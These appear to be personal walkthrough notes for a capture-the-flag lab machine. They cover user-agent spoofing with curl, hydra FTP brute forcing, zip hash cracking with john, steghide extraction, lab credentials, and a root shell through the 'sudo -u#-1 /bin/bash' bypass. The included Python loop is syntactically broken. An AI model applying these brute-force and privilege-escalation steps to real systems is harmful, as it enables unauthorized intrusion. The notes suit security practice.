10.10.126.170
 
 nmap  
port:  
21 ftp  
22 ssh  
80 http
 
go to webpage  
use chrome and user-agent switcher extension to change user-agent to 'C' (try a-z)  
Or  
curl -I -G -A "C" -L <ip>  
-A spoof user-agent  
-L follow any redirects  
-i includes header response  
-G makes GET request  
see Location: agent_C_attention.php
 
We get 302 status code: redirect found, so use -L to follow redirect with new user-agent
 
" if you want python script for searching all user agent in alphabet "  
import os  
Import string
 
List = String.ascii_letters
 
for i in list:  
os.system("curl -G -A 'i' -L 10.10.112.161")
 
Chris  
Agent J  
Agent R
 
hydra for ftp password  
crystal
 
get files from ftp
 
download binwalk, extract .zip file // other good tools: exiftool/stegcracker/steghide
 
find zip file, zip2john, john, for passphrase for zip  
open .zip with password
 
"  
Agent C,
 
We need to send the picture to 'QXJlYTUx' as soon as possible!
 
By,  
Agent R  
"
 
decode word from base64 (echo <text> | base64 -d)
 
Area51
 
steghide extract -sf <pic>
 
James:hackerrules!
 
find ssh password for james in messages.txt  
ssh in  
scp <usr>@<ip>:<file> </local dir> (on attacker machine)
 
reverse image search google, find fox news article says roswell alien autopsy
 
sudo -l, copy paste (ALL, !root) /bin/bash, find exploit-db page, read it  
sudo -u#-1 /bin/bash, for root shell  
cd /root
    
chris:crystal  
james:hackerrules!